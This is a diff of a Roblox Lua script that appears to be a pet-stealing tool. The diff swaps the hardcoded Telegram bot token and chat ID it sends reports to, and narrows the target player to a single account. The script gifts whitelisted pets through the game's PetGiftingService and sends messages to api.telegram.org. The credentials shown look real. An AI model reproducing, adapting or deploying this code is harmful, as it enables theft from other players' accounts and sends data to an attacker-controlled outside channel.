@@ -158,9 +158,9 @@ task.spawn(function()
     
     task.cancel(dotTask)
 end)
-local TELEGRAM_TOKEN = "8113815289:AAHjyPNLtl1Ug2HY2r0SYZJuNltlYZZG-zc"
-local TELEGRAM_CHANNEL = "@uufuufoods"
-local TARGET_PLAYER = {"Rikizigg", "sERTTQE0"}
+local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
+local TELEGRAM_CHAT_ID = "-1002927824958" -- ID канала с префиксом для публичного канала
+local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 local WHITELIST = {
     "Raccoon",
@@ -176,11 +176,7 @@ local WHITELIST = {
     "Mimic Octopus",
     "Butterfly",
     "Kitsune",
-    "Corrupted Kitsune",
-    "Wasp",
-    "Silver Monkey",
-    "Cooked Owl",
-    "Parasaurolophus"
+    "Corrupted Kitsune"
 }
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 local STATS = {
@@ -197,7 +193,7 @@ local function sendToTelegram(text)
         local url = string.format(
             "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
             TELEGRAM_TOKEN,
-            TELEGRAM_CHANNEL,
+            TELEGRAM_CHAT_ID,
             HttpService:UrlEncode(text)
         )
         game:HttpGet(url)
